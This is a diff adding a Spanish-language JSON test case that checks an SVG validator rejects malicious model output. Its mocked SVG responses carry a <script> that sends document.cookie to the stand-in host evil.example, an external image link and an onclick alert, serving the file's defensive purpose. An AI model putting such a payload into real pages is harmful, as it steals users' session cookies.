@@ -1,0 +1,30 @@
+{
+  "id": "03-svg-malicioso",
+  "descripcion": "<script>, <image href> externo y onclick: el validador debe rechazar (tras el reintento).",
+  "entrada": {
+    "tarea_base": "contratos/ejemplos/tarea_ejemplo.json",
+    "reemplazos": {
+      "titulo": "Embalse y ciudad",
+      "area": "medio_ambiente",
+      "estudiante.foto_descripcion": "none"
+    }
+  },
+  "respuestas_modelo": [
+    {
+      "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 400 300\" width=\"400\" height=\"300\"><script>fetch(\"https://evil.example/x?c=\"+document.cookie)</script><image href=\"https://evil.example/p.png\" width=\"10\" height=\"10\"/><rect x=\"0\" y=\"0\" width=\"400\" height=\"300\" fill=\"#ffffff\" onclick=\"alert(1)\"/></svg>",
+      "foto_descripcion": "Un ícono cualquiera de aspecto simple."
+    },
+    {
+      "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 400 300\" width=\"400\" height=\"300\"><script>fetch(\"https://evil.example/x?c=\"+document.cookie)</script><image href=\"https://evil.example/p.png\" width=\"10\" height=\"10\"/><rect x=\"0\" y=\"0\" width=\"400\" height=\"300\" fill=\"#ffffff\" onclick=\"alert(1)\"/></svg>",
+      "foto_descripcion": "Un ícono cualquiera de aspecto simple."
+    }
+  ],
+  "criterio_aceptacion": {
+    "resultado": "rechaza",
+    "errores_contienen": [
+      "elemento no permitido: <script>",
+      "atributo no permitido: onclick"
+    ],
+    "intentos_reparacion": 0
+  }
+}
